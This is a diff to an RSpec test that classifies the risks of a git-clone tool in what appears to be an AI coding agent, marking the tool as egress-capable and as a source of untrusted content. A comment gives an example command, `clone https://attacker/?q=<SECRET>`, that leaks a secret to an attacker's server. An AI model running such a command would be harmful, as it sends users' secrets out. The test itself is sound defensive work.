@@ -5,7 +5,7 @@ RSpec.describe 'pikuri-code tool trifecta legs (bash aside)' do
     # Same family as fetch, not a softer one: `clone https://attacker/?q=<SECRET>`
     # reaches a server the attacker reads, and the cloned tree is their content.
     legs = Pikuri::Code::GitClone.new(filesystem: nil).trifecta_legs
-    assert_equal :autonomous, legs.egress
+    assert_equal :unreviewed, legs.egress_payload_review
     assert_equal :hard, legs.untrusted
   end
 
